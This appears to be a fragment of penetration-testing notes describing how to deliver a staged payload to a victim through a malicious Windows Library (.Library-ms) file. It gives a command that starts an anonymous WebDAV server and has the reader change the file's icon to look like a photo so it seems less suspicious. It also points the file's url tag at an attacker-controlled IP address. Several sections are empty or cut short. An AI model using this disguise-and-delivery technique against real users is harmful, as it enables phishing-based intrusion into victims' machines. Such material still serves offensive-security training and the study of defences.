# Windows Library Files

[Windows Library Files](https://learn.microsoft.com/en-us/windows/client-management/client-tools/windows-libraries) have a _**.Library-ms**_ extensions and are executed by double clicking on them.





##

## WebDAV

In order to share our malicious Windows Library file to the victim we will create a WebDAV share to host the staged payload.

### Start WebDAV Server

```bash
──(env)─(kali㉿kali)-[~/web]
└─$ /home/kali/env/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/web/
```

## Create Windows Library File

We will create a new file on our Windows host and name it "**dog.Library-ms**".

Right now the icon is a little suspicious, let's change it to something else, like a photo.



## Customizing Library File



### Change Icon

```
<iconReference>imageres.dll, -1003</iconReference>
```

## Testing & Fixing Serialization&#x20;

We can test to see if it's working by double clicking our "dog" icon on the deskop.&#x20;

### Re-open Visual Studio Code

We can see if the re-open "dog" that the code has been changed. This happens due to Windows trying to optimize the WebDAV communication with the client. So before we ship it off the the victim we have to make sure that we've fixed it and NOT OPENED it on our end.&#x20;

Delete the serialized tag and fix the url tag with:

```
<url>http://192.168.119.2</url>
```
